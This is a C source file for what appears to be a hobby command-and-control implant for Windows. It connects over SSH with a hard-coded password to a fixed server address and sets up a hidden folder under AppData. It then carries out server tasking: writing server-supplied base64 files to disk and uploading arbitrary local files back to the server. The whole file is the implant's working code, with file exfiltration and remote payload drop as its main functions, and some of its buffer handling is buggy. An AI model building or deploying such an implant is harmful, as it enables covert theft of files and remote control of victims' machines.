#include "Header.h"

struct tasking_struct* firstStruct = NULL;
struct tasking_struct* lastStruct = NULL;
char folderpath[256] = "C:\\Users\\";
FILE* logfile;

int parse_tasking(char* tasking, ssh_channel chan) {
	/* Parses and handles the tasking input from the server*/

	// checks if there is no tasking
	if (!strncmp(tasking, "default", 7)) {
		fprintf(logfile, "No tasks to do. Quitting...\n");
		ssh_channel_write(chan, "0", 2);
		return 0;
	}

	// get the number of instructions to complete
	int num = 0;
	char* tmp = tasking;
	char* dat = NULL;
	char tmpbf[3];

	for (; tasking[num]; tasking[num] == '\n' ? num++ : *tasking++);
	tasking = tmp;
	fprintf(logfile, "Number of tasks to do: %d\n", num);
	//struct tasking_struct* tasking_arr[num];
	if (num == 0) return 0;

	char* p = strtok(tasking, "\n");

	// Parses the data into list
	while (p != NULL)
	{
		// get operation int
		memset(tmpbf, 0, sizeof(tmpbf));
		strncat(tmpbf, p, 2);
		struct tasking_struct* curr = malloc(sizeof(struct tasking_struct));
		curr->operation = atoi(tmpbf);

		// get options for operation
		dat = _strdup(p + 3);
		curr->opts = dat;

		if (firstStruct == NULL) {
			firstStruct = curr;
			lastStruct = curr;
		}
		else {
			lastStruct->nextStruct = curr;
			lastStruct = curr;
		}


		// clean up and move on
		p = strtok(NULL, "\n");
		//memset(tmpbf, 0, 2);
	}
	if (firstStruct == NULL) return 0;

	for (int j = 0; j < num; j++) {
		switch (firstStruct->operation)
		{
		case AGENT_DOWN_FILE:
			fprintf(logfile, "Received orders to download file %s\n", firstStruct->opts);
			char *contents;
			char size[256];

			char *send = malloc(sizeof(*send) * (4+strlen(firstStruct->opts)));
			char temp2[3];
			_itoa(firstStruct->operation, temp2, 10);
			strcpy(send, temp2);
			strcat(send, "|");
			strcat(send, firstStruct->opts);
			ssh_channel_write(chan, send, strlen(send)+1);
			ssh_channel_read(chan, size, sizeof(size), 0);
			ssh_channel_write(chan, "ok", 3);
			
			size_t memsize = atoi(size) + 1;

			contents = malloc(sizeof(*contents) * memsize);

			ssh_channel_read(chan, contents, memsize, 0);
			contents[atoi(size)] = '\0';
			ssh_channel_write(chan, "ok", 3);

			char *filecontent = malloc(sizeof(*filecontent) * b64_decoded_size(contents));
			b64_decode(contents, filecontent, b64_decoded_size(contents));
			filecontent[b64_decoded_size(contents)] = '\0';

			FILE* file;

			char filename[256] = "";
			strcpy(filename, folderpath);
			strcat(filename, "\\");
			strcat(filename, firstStruct->opts);
			file = fopen(filename, "w");

			if (file == NULL)
			{
				fprintf(logfile, "Unable to create file.\n");
			}
			else {
				fputs(filecontent, file);
				fclose(file);
			}
			break;
		case AGENT_UP_FILE:
			fprintf(logfile, "Got tasking to upload file %s\n", firstStruct->opts);
			char* ufilename;
			FILE* toupload;
			char* sendcommand;
			char* filedata;
			char temp[14];

			ufilename = malloc(sizeof(ufilename) * strlen(firstStruct->opts));
			int lastslash = 0;
			for (int i = 0; i < strlen(firstStruct->opts); ++i) {
				if (firstStruct->opts[i] == '\\') lastslash = i;
			}
			
			strncpy(ufilename, firstStruct->opts + lastslash + 1, strlen(firstStruct->opts));

			toupload = fopen(firstStruct->opts, "r");
			fseek(toupload, 0L, SEEK_END);
			int uploadsize = ftell(toupload);
			int uploadsizee = b64_encoded_size(uploadsize);
			sendcommand = malloc(sizeof(sendcommand) * (strlen(firstStruct->opts) + 3));
			filedata = malloc(sizeof(filedata) * (uploadsize + 1));
			strcpy(sendcommand, "11|");
			strcat(sendcommand, ufilename);
			rewind(toupload);

			ssh_channel_write(chan, sendcommand, strlen(sendcommand));
			ssh_channel_read(chan, temp, 3, 0);
			char sizebuf[64] = "ok";
			sprintf(temp, "%d", uploadsizee);
			ssh_channel_write(chan, temp, sizeof(temp));
			ssh_channel_read(chan, temp, 3, 0);

			fread(filedata, 1, uploadsize, toupload);
			char* encodedfiledata = b64_encode((unsigned char*)filedata, uploadsize);
			ssh_channel_write(chan, encodedfiledata, uploadsizee);
			ssh_channel_read(chan, temp, 8, 0);

			break;
		default:
			fprintf(logfile, "ERROR: Caught unknown tasking value: %d\n", firstStruct->operation);
			break;
		}
		struct tasking_struct* temp = firstStruct;
		firstStruct = firstStruct->nextStruct;
		free(temp);
	}
	return 0;
}


int func_loop(ssh_session session)	//probably replace
{
	/* Primary function loop */
	// Initialize vars
	ssh_channel channel;
	int rc;
	char tasking[2048];
	int nbytes;

	memset(tasking, 0, sizeof(tasking));
	channel = ssh_channel_new(session);

	fprintf(logfile, "[+] Created new SSH channel\n");
	if (channel == NULL)
		return SSH_ERROR;

	// Open channel
	rc = ssh_channel_open_session(channel);
	fprintf(logfile, "[+] Opened SSH Channel with remote server\n");
	if (rc != SSH_OK)
	{
		ssh_channel_free(channel);
		return rc;
	}

	// Request a shell interface
	rc = ssh_channel_request_shell(channel);

	fprintf(logfile, "[ ] Sent request for shell\n");
	if (rc != SSH_OK)
	{
		ssh_channel_close(channel);
		ssh_channel_free(channel);
		return rc;
	}
	fprintf(logfile, "[+] Made it through check\n");

	// Begin the meat of the stuff


	// Send the global ID

	fprintf(logfile, "Identified as an agent\n");
	rc = ssh_channel_write(channel, "1", 2);

	//write that I am an agent
	char temp3[3];
	ssh_channel_read(channel, temp3, 3, 0);
	ssh_channel_write(channel, "NA\nNA\nNA\nNA\nNA", 15);

	fprintf(logfile, "Waiting for read...\n");
	nbytes = ssh_channel_read(channel, tasking, sizeof(tasking), 0);
	fprintf(logfile, "read %d bytes from channel\n", nbytes);
	if (nbytes < 0) {
		fprintf(logfile, "Caught read error from server...\n");
		ssh_channel_close(channel);
		ssh_channel_free(channel);
		return SSH_ERROR;
	}

	fprintf(logfile, "Read data: %s\n", tasking);
	parse_tasking(tasking, channel);

	// close connections
	rc = ssh_channel_write(channel, "0", 2);
	if (rc == SSH_ERROR) {
		fprintf(logfile, "Caught ssh error: %s\n", ssh_get_error(channel));
		ssh_channel_close(channel);
		ssh_channel_free(channel);
		return SSH_ERROR;
	}

	rc = ssh_channel_close(channel);
	if (rc == SSH_ERROR) {
		fprintf(logfile, "Caught ssh error: %s\n", ssh_get_error(channel));
		ssh_channel_free(channel);
		return rc;
	}

	ssh_channel_free(channel);

	return SSH_OK;
}

ssh_session connectserver(const char* host, const char* user) {
	/*Connect to server*/
	ssh_session session;

	// initialize ssh session structure
	session = ssh_new();
	if (session == NULL) {
		fprintf(logfile, "Session is NULL\n");
		return NULL;
	}

	// check and set username
	int loginuser = ssh_options_set(session, SSH_OPTIONS_USER, user);
	if (loginuser < 0) {
		fprintf(logfile, "Setting Username Error: %i\n", loginuser);
		return NULL;
	}

	// set target host
	int loginhost = ssh_options_set(session, SSH_OPTIONS_HOST, host);
	if (loginhost < 0) {
		fprintf(logfile, "Setting Host Error: %i\n", loginhost);
		return NULL;
	}

	// make the connection
	if (ssh_connect(session)) {
		fprintf(logfile, "Connection failed : %s\n", ssh_get_error(session));
		return NULL;
	}

	// Try to authenticate
	int auth = ssh_userauth_none(session, NULL);
	if (auth == SSH_AUTH_ERROR) {
		fprintf(logfile, "Authentication failed: %s\n", ssh_get_error(session));;
		return NULL;
	}

	//send password
	int password = ssh_userauth_password(session, NULL, "lala");	//change the password'lala' at some point
	if (password != SSH_AUTH_SUCCESS) {
		fprintf(logfile, "Authentication failed: %i\n", password);
		return NULL;
	}
	if (password == SSH_AUTH_SUCCESS) return session;
}

int main()
{
	char actualusername[256] = "";
	TCHAR username[UNLEN + 1];
	DWORD size = UNLEN + 1;
	GetUserName((TCHAR*)username, &size);
	strncpy(actualusername, &(char)(username[0]), 1);
	for (int i = 1; i <= sizeof(username); i++) {
		if (isalpha(username[i]) | isdigit(username[i])) strncat(actualusername, &(char)(username[i]), 1);
		else break;
	}
	strcat(folderpath, actualusername);
	strcat(folderpath, "\\AppData\\Roaming\\NICKTEST");
	mkdir(folderpath);

	char logpath[256] = "";
	strcpy(logpath, folderpath);
	strcat(logpath, "\\log.txt");
	logfile = fopen(logpath, "a");
	
	fprintf(logfile, "==============================\n\n");

	ssh_session session = NULL;
	session = connectserver("192.168.0.88", "WINDOWS_CLIENT");	//Make this less hard-coded

	if (session == NULL) {
		fprintf(logfile, "Failed to create SSH session\n\n");
		ssh_disconnect(session);
		ssh_free(session);
		ssh_finalize();
		fclose(logfile);
		return 0;
	}


	func_loop(session);

	ssh_disconnect(session);
	ssh_free(session);
	ssh_finalize();
	fprintf(logfile, "Successfully disconnected from server\n\n");
	fclose(logfile);
	return 0;
}